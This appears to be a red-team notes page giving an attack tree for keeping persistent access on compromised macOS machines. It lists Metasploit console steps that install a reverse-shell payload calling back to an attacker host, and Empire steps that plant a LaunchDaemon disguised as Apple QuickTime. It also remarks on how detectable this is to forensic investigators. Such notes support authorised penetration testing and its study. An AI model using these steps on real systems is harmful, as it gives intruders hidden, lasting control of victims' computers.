# Maintaining access on macOS

## Attack tree

```text
1 Maintain access on macOS using meterpreter
    1.1 In meterpreter background the current basic shell (AND)
    1.2  > use exploit/osx/local/persistence (AND)
    1.3 Set RUN_NOW to true (AND)
    1.4 Set SESSION to the id of the basic shell just put in the background (AND)
    1.5 > show payloads (AND)
    1.6 Inject payload (such as osx/x86/shell_reverse_tcp) as a service with > set PAYLOAD [payload] (AND)
    1.7 Set LHOST and LPORT
    1.8 > exploit
    1.9 Copy the three commands given for cleanup later
2 Maintain access on macOS using empire 
    2.1 Empire agent with high integrity (root) running on macOS (see privilige escalation on macOS tree) (AND)
    2.2 > interact with agent
    2.3 > usemodule persistence/osx/Launchdaemonexecutable
    2.4 > info (to see all options)
    2.5 > set DaemonLocation [absolute path] (for example /Library/Application Support/QuickTimeDaemon)
    2.6 > set DaemonName [value] (com.apple.QuickTime in our case)
    2.7 > set Listener [value] (http in our case)
    2.8 > execute
```

## Notes

* The empire method reports it is not opsec safe. A forensics artist may be able to tell we were there.

## Cheatsheets

* [Linux post exploitation enumeration](cheatsheets:docs/enumeration/linux-post)
* [Offensive security: Meterpreter Basic Commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
* [Metasploit documentation](https://docs.metasploit.com/)